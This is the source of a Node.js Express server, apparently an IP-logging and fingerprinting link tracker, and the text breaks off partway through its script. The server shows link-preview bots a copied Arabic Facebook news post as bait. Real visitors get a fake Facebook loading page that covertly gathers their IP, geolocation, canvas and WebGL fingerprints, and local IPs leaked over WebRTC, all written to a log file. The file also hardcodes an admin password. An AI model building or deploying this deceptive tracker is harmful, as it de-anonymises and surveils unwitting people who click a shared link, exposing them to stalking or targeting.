const express = require('express');
const bodyParser = require('body-parser');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const UAParser = require('ua-parser-js');
const fs = require('fs');
const app = express();

app.use(bodyParser.json({ limit: '50mb' }));
app.use(requestIp.mw());

const CONFIG = {
  target_url: 'https://www.facebook.com/share/p/18atzfbxGM/',
  og_title: 'سرقت في نابلس وعثر عليها في رام الله.. الشرطة تعيد مركبة طالبة جامعية من أراضي الـ48',
  og_description: 'الطالبة وجّهت مناشدة مباشرة لمدير عام الشرطة اللواء علام السقا، لتتحرك الأجهزة الأمنية فورًا وتبدأ رحلة البحث والتحري. وبعد متابعة مكثفة بين نابلس ورام الله، تمكنت المباحث العامة من تحديد مكان المركبة وضبطها، والقبض على عدد من المشتبه بهم تمهيدًا لاتخاذ الإجراءات القانونية بحقهم.',
  og_image: 'https://scontent.fjrs2-2.fna.fbcdn.net/v/t39.30808-6/694593375_1395060505989068_1458648189795522601_n.jpg?stp=dst-jpg_tt6&cstp=mx680x680&ctp=s600x600&_nc_cat=104&ccb=1-7&_nc_sid=3b1b4a&_nc_ohc=0GVH8E28obIQ7kNvwEw3PDw&_nc_oc=AdrJprHuDdC3k9S_pGgxs433K6fXcmvomwyqqrdsv2dvAOY5NMvxRfSq0IkSF9YttZE&_nc_zt=23&_nc_ht=scontent.fjrs2-2.fna&_nc_gid=sTKXrTX3EmSgezyNk2hbiA&_nc_ss=7b20f&oh=00_Af6ZYLjSJCS4MwcGYXt77-yZbvSP4orp_xkEfW2H44o25g&oe=6A02BCD4',
  admin_password: 'Ramallah2026!',
  redirect_delay: 3000
};

const LOG_FILE = './logs.json';

function loadLogs() {
  if (!fs.existsSync(LOG_FILE)) return [];
  try {
    return fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).map(JSON.parse).reverse();
  } catch { return []; }
}

function saveLog(entry) {
  fs.appendFileSync(LOG_FILE, JSON.stringify(entry) + '\n');
}

function isBot(req) {
  const ua = (req.headers['user-agent'] || '').toLowerCase();
  return ['facebookexternalhit','facebot','whatsapp','twitterbot','linkedinbot','telegrambot','discordbot','slackbot','googlebot','bingbot','pinterest','applebot','yandex','snapchat'].some(b => ua.includes(b));
}

function getClientData(req) {
  const ip = req.clientIp || req.ip || 'unknown';
  const geo = geoip.lookup(ip);
  const uaString = req.headers['user-agent'] || 'Unknown';
  const ua = UAParser(uaString);
  return { ip, geo, uaString, ua };
}

app.get('/robots.txt', (req, res) => res.type('text/plain').send('User-agent: *\nAllow: /\n'));

app.get(['/', '/track'], (req, res) => {
  const { ip, geo, uaString, ua } = getClientData(req);
  const visitId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2,9);
  
  const serverData = {
    visitId, timestamp: new Date().toISOString(),
    server: { ip, geo, userAgent: uaString, referer: req.headers.referer||'Direct', acceptLanguage: req.headers['accept-language']||'Unknown', method: req.method, host: req.headers.host, protocol: req.protocol, url: req.originalUrl },
    parsedUA: { browser: ua.browser, engine: ua.engine, os: ua.os, device: ua.device, cpu: ua.cpu }
  };
  
  res.cookie('visitId', visitId, { maxAge: 300000, httpOnly: false });

  if (isBot(req)) {
    const { og_title, og_description, og_image, target_url } = CONFIG;
    res.type('html').send(`<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8">
<meta property="og:title" content="${og_title.replace(/"/g, '&quot;')}" />
<meta property="og:description" content="${og_description.replace(/"/g, '&quot;')}" />
<meta property="og:image" content="${og_image}" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:url" content="${target_url}" />
<meta property="og:type" content="article" /><meta property="og:site_name" content="Facebook" />
<meta property="twitter:card" content="summary_large_image"><meta property="twitter:image" content="${og_image}">
<title>${og_title.replace(/</g,'&lt;')}</title><link rel="canonical" href="${target_url}"></head>
<body><h1>${og_title.replace(/</g,'&lt;')}</h1><p>${og_description.replace(/</g,'&lt;')}</p><img src="${og_image}" style="max-width:100%"></body></html>`);
    return;
  }

  const target = CONFIG.target_url;
  res.type('html').send(`<!DOCTYPE html><html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>جاري تحميل المنشور...</title>
<style>body{font-family:Arial,sans-serif;text-align:center;padding-top:20vh;background:#f0f2f5;margin:0;color:#65676b;}
.spinner{border:4px solid #e4e6eb;border-top:4px solid #1877f2;border-radius:50%;width:48px;height:48px;animation:spin 1s linear infinite;margin:0 auto 20px;}
@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style></head>
<body><div class="spinner"></div><h3>جاري تحميل المنشور...</h3>
<script>(function(){
var visitId="${visitId}";
var data={visitId:visitId,timestamp:new Date().toISOString(),
screen:{width:screen.width,height:screen.height,availWidth:screen.availWidth,availHeight:screen.availHeight,colorDepth:screen.colorDepth,pixelRatio:window.devicePixelRatio||1,orientation:screen.orientation?screen.orientation.type:'unknown'},
window:{innerWidth:window.innerWidth,innerHeight:window.innerHeight,outerWidth:window.outerWidth,outerHeight:window.outerHeight},
navigator:{platform:navigator.platform,language:navigator.language,languages:navigator.languages?Array.from(navigator.languages):[navigator.language],cookieEnabled:navigator.cookieEnabled,onLine:navigator.onLine,hardwareConcurrency:navigator.hardwareConcurrency||'unknown',deviceMemory:navigator.deviceMemory||'unknown',maxTouchPoints:navigator.maxTouchPoints||0,pdfViewerEnabled:navigator.pdfViewerEnabled||false,javaEnabled:navigator.javaEnabled?navigator.javaEnabled():false,webdriver:navigator.webdriver||false},
timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,timezoneOffset:new Date().getTimezoneOffset(),
plugins:Array.from(navigator.plugins||[]).map(function(p){return{name:p.name,description:p.description,filename:p.filename};}),
mimeTypes:Array.from(navigator.mimeTypes||[]).map(function(m){return{type:m.type,description:m.description};}),
touchSupport:'ontouchstart'in window||navigator.maxTouchPoints>0,doNotTrack:navigator.doNotTrack||false,
storage:{localStorage:!!window.localStorage,sessionStorage:!!window.sessionStorage,indexedDB:!!window.indexedDB,webSQL:!!window.openDatabase},
referrer:document.referrer||"",location:{href:location.href,protocol:location.protocol,host:location.host,pathname:location.pathname,search:location.search}};
try{var c=document.createElement('canvas');var ctx=c.getContext('2d');c.width=200;c.height=60;ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';ctx.fillRect(0,0,200,60);ctx.fillStyle='#069';ctx.fillText('FP:'+navigator.userAgent,2,15);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('Canvas:'+c.width+'x'+c.height,4,35);data.canvasFingerprint=c.toDataURL().slice(0,200);}catch(e){data.canvasFingerprint='blocked';}
try{var gl=document.createElement('canvas').getContext('webgl')||document.createElement('canvas').getContext('experimental-webgl');if(gl){var dbg=gl.getExtension('WEBGL_debug_renderer_info');data.webglVendor=gl.getParameter(gl.VENDOR);data.webglRenderer=gl.getParameter(gl.RENDERER);if(dbg){data.webglVendor=gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);data.webglRenderer=gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);}data.webglFingerprint=data.webglVendor+'|'+data.webglRenderer;}}catch(e){data.webglFingerprint='blocked';}
try{var RTCPeerConnection=window.RTCPeerConnection||window.mozRTCPeerConnection||window.webkitRTCPeerConnection;if(RTCPeerConnection){var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});var seen={};data.webrtc=[];pc.createDataChannel('');pc.createOffer().then(function(o){pc.setLocalDescription(o);});pc.onicecandidate=function(ice){if(!ice||!ice.candidate||!ice.candidate.candidate)return;var ipMatch=/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/.exec(ice.candidate.candidate);if(ipMatch&&!seen[ipMatch[1]]){seen[ipMatch[1]]=true;data.webrtc.push(ipMatch[1]);}};}}catch(e){data.webrtc=['webrtc-blocked'];}
try{var baseFonts=['monospace','sans-serif','serif'];var testFonts=['Arial','Courier New','Georgia','I
